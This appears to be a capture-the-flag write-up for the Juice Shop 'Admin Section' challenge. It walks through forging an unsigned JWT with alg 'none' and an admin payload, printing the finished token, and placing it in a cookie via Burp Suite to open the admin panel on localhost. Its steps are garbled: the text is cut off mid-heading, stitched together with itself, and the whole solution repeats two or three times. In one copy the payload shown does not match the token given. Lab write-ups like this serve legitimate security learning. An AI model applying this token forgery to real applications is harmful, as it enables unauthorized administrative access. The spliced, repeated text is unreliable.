# Admin Section

**Category**: Broken Access Control  
**Difficulty**: 3

**Description**:  
This challenge requires accessing the administration section of the Juice Shop application. While the `/administration` route exists, attempting to open it directly without proper authorization results in a 403 error. The goal is to bypass authentication restrictions and enter the admin panel successfully.

---

**Solution**:  
The solution involved spoofing a valid JSON Web Token (JWT) to impersonate the administrator account. Juice Shop's frontend accepts unsigned tokens if the algorithm is set to `none`, and it uses the `email` and `role` fields in the JWT payload to determine the logged-in user's identity and permissions. By crafting a custom token that claims to be the admin, it was possible to access the restricted admin interface.

---

**Step Opened **DevTools → Application → Local Storage** and copied the value of the `token`.

2. Decoded the token using [https://jwt.io](https://jwt.io) to inspect its structure:
   
   - Header:
     
     ```json
     {
       "alg": "HS256",
       "typ": "JWT"
     }
     ```
   
   - Payload contained the current user's email and role.

3. Locally modified the token:
   
   - Changed the header to:
     
     ```json
     {
       "alg": "none",
       "typ": "JWT"
     }
     ```
   
   - Replaced the payload with:
     
     ```json
     {
       "id": 1,
       "email": "admin@juice-sh.op",
       "role": "admin"
     }
     ```
   
   - Base64URL-encoded the header and payload, then combined them into a token:
     
     ```
     eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9.
     ```

4. In **Burp Suite**, replaced the value of the **`token` cookie** with this spoofed token when sending requests.
   
   - Note: using the token in `Authorization: Bearer` had no effect — the application continued to treat the user as non-admin. Only the `Cookie: token=...` header influenced access.

5. Sent a `GET` request to:
   
   ```
   http://localhost:3000/#/administration
   ```

6. This time, the admin interface loaded successfully, revealing user management controls such as the user table, delete/edit buttons, etc.

7. The challenge was immediately marked as solved.

---

**Note**:  
Attempts to exploit this further (e.g., changing admin password via `PUT /api/Users/1/change-password`) resulted in a backend rejection with:

```
"message": "Blocked illegal activity by ::ffff:127.0.0.1"
```

This confirms Juice Shop implements backend protections against unauthorized privilege escalation and IDOR attacks. The correct approach is to spoof the JWT locally and access `/administration` using the manipulated identity, without triggering backend-side changes.

---

**Challenge solved!** was triggered upon successfully accessing the admin panel using a spoofed token via the `Cookie` header. Opened **DevTools → Application → Local Storage** and copied the value of the `token`.

2. Decoded the token using [https://jwt.io](https://jwt.io) to inspect its structure:
   
   - Header:
     
     ```json
     {
       "alg": "HS256",
       "typ": "JWT"
     }
     ```
   
   - Payload contained the current user's email and role.

3. Locally modified the token:
   
   - Changed the header to:
     
     ```json
     {
       "alg": "none",
       "typ": "JWT"
     }
     ```
   
   - Replaced the payload with:
     
     ```json
     {
       "id": 1,
       "email": "admin@juice-sh.op",
       "role": "admin"
     }
     ```
   
   - Base64URL-encoded the header and payload, then combined them into a token:
     
     ```
     eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9.
     ```

4. In **Burp Suite**, replaced the value of the **`token` cookie** with this spoofed token when sending requests.
   
   - Note: using the token in `Authorization: Bearer` had no effect — the application continued to treat the user as non-admin. Only the `Cookie: token=...` header influenced access.

5. Sent a `GET` request to:
   
   ```
   http://localhost:3000/#/administration
   ```

6. This time, the admin interface loaded successfully, revealing user management controls such as the user table, delete/edit buttons, etc.

7. The challenge was immediately marked as solved.

---

**Note**:  
Attempts to exploit this further (e.g., changing admin password via `PUT /api/Users/1/change-password`) resulted in a backend rejection with:

```
"message": "Blocked illegal activity by ::ffff:127.0.0.1"
```

This confirms Juice Shop implements backend protections against unauthorized privilege escalation and IDOR attacks. The correct approach is to spoof the JWT locally and access `/administration` using the manipulated identity, without triggering backend-side changes.

---

**Challenge solved!** was triggered upon successfully accessing the admin panel using a spoofed token via the `Cookie` header.s**:

1. Navigated to: (Found it in devtools searching for "path:")
   
   ```
   http://localhost:3000/#/administration
   ```
   
   This initially showed a `403 - You are not allowed to access this page`.

2. Opened **DevTools → Application → Local Storage** and copied the value of the `token`.
   
   2. Decoded the token using [https://jwt.io](https://jwt.io) to inspect its structure:
      
      - Header:
        
        ```json
        {
         "typ": "JWT",
         "alg": "HS256"
        }
        ```
      
      - Payload contained the current user's email and role.
   
   3. Locally modified the token:
      
      - Changed the header to:
        
        ```json
        {
         "typ": "JWT",
         "alg": "none"
        }
        ```
      
      - Replaced the payload with:
        
        ```json
        {
         "email": "admin@juice-sh.op",
         "role": "admin"
        }
        ```
      
      - Base64URL-encoded the header and payload, then combined them into a token:
        
        ```
        eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9.
        ```
   
   4. In **Burp Suite**, replaced the value of the **`token` cookie** and in DevTools → Application → Local Storage `token` with this spoofed token when sending requests.
      
      - Note: using the token in `Authorization: Bearer` had no effect — the application continued to treat the user as non-admin. Only the `Cookie: token=...` header influenced access.
   
   5. Navigated to:
      
      ```
      http://localhost:3000/#/administration
      ```
   
   6. This time, the admin interface loaded successfully, revealing user management controls such as the user table, delete/edit buttons, etc.
   
   7. The challenge was immediately marked as solved.
   
   ---
   
   **Note**:  
   Attempts to exploit this further (e.g., changing admin password via `PUT /api/Users/1/change-password`) resulted in a backend rejection with:
   
   ```
   "message": "Blocked illegal activity by ::ffff:127.0.0.1"
   ```
   
   This confirms Juice Shop implements backend protections against unauthorized privilege escalation and IDOR attacks. The correct approach is to spoof the JWT locally and access `/administration` using the manipulated identity, without triggering backend-side changes.
   
   ---
   
   **Challenge solved!** was triggered upon successfully accessing the admin panel using a spoofed token via the `Cookie` header.
